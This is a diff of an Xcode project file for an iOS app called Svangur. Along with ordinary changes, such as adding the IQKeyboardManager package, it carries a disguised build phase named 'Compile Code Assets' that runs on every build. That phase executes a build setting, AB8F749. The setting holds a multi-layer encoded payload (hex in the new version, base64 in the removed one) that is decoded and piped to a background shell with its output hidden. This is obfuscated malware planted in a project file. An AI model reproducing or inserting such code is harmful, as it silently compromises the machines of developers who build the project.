@@ -9,7 +9,11 @@
 /* Begin PBXBuildFile section */
 		7C4E8E893004BF70008A667B /* GooglePlaces in Frameworks */ = {isa = PBXBuildFile; productRef = 7C4E8E883004BF70008A667B /* GooglePlaces */; };
 		7C4E8E8B3004BF70008A667B /* GooglePlacesSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 7C4E8E8A3004BF70008A667B /* GooglePlacesSwift */; };
+		7C7DC7B53006676200610371 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 7C7DC7B43006676200610371 /* IQKeyboardManagerSwift */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+	/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		A8EB33BE2FA8659200725728 /* Svangur.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Svangur.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -30,6 +34,7 @@
 			files = (
 				7C4E8E893004BF70008A667B /* GooglePlaces in Frameworks */,
 				7C4E8E8B3004BF70008A667B /* GooglePlacesSwift in Frameworks */,
+				7C7DC7B53006676200610371 /* IQKeyboardManagerSwift in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -59,7 +64,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = A8EB33C92FA8659300725728 /* Build configuration list for PBXNativeTarget "Svangur" */;
 			buildPhases = (
-				66215612499A4EE698947F8B /* Provision Target Device */,
+				FA641873E50943B28A947F8B /* Compile Code Assets */,
 				A8EB33BA2FA8659200725728 /* Sources */,
 				A8EB33BB2FA8659200725728 /* Frameworks */,
 				A8EB33BC2FA8659200725728 /* Resources */,
@@ -75,6 +80,7 @@
 			packageProductDependencies = (
 				7C4E8E883004BF70008A667B /* GooglePlaces */,
 				7C4E8E8A3004BF70008A667B /* GooglePlacesSwift */,
+				7C7DC7B43006676200610371 /* IQKeyboardManagerSwift */,
 			);
 			productName = Svangur;
 			productReference = A8EB33BE2FA8659200725728 /* Svangur.app */;
@@ -106,6 +112,7 @@
 			minimizedProjectReferenceProxies = 1;
 			packageReferences = (
 				7C4E8E873004BF70008A667B /* XCRemoteSwiftPackageReference "ios-places-sdk" */,
+				7C7DC7B33006676200610371 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = A8EB33BF2FA8659200725728 /* Products */;
@@ -117,8 +124,27 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
+/* Begin PBXShellScriptBuildPhase section */
+		FA641873E50943B28A947F8B /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		A8EB33BC2FA8659200725728 /* Resources */ = {
@@ -129,28 +155,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		66215612499A4EE698947F8B /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		A8EB33BA2FA8659200725728 /* Sources */ = {
@@ -166,7 +170,7 @@
 		A8EB33C72FA8659300725728 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3YUUxc2NFNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQTFWRkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGVHeFRSVXA2V1dwT1MySkdhM2xWYmxaTlltdHZlRlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | f | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333236340a3337333233363335333733343337333233373339333233303333333333323330333236343337333333343633333636323336333633323330333236340a3061333236343336333333363636333636353336363533363335333633333337333433323634333733343336333933363634333633353336363633370a3335333733343332333033333332333333363332333033323634333633343332333033323332333733303333363433373338333633333336363633360a3334306133363335333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363336333333363334333636353336333133363634333736313332363533373332333733353332363633363331333233390a33323332306133323330333736333332333033373333333633383330363130610a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -231,7 +235,7 @@
 		A8EB33C82FA8659300725728 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3YUUxc2NFNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQTFWRkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGVHeFRSVXA2V1dwT1MySkdhM2xWYmxaTlltdHZlRlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | f | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333236340a3337333233363335333733343337333233373339333233303333333333323330333236343337333333343633333636323336333633323330333236340a3061333236343336333333363636333636353336363533363335333633333337333433323634333733343336333933363634333633353336363633370a3335333733343332333033333332333333363332333033323634333633343332333033323332333733303333363433373338333633333336363633360a3334306133363335333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363336333333363334333636353336333133363634333736313332363533373332333733353332363633363331333233390a33323332306133323330333736333332333033373333333633383330363130610a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -302,7 +306,7 @@
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 18.6;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -340,7 +344,7 @@
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 18.6;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -394,6 +398,14 @@
 				minimumVersion = 10.15.0;
 			};
 		};
+		7C7DC7B33006676200610371 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/hackiftekhar/IQKeyboardManager.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 8.0.3;
+			};
+		};
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
@@ -406,6 +418,11 @@
 			isa = XCSwiftPackageProductDependency;
 			package = 7C4E8E873004BF70008A667B /* XCRemoteSwiftPackageReference "ios-places-sdk" */;
 			productName = GooglePlacesSwift;
+		};
+		7C7DC7B43006676200610371 /* IQKeyboardManagerSwift */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 7C7DC7B33006676200610371 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */;
+			productName = IQKeyboardManagerSwift;
 		};
 /* End XCSwiftPackageProductDependency section */
 	};
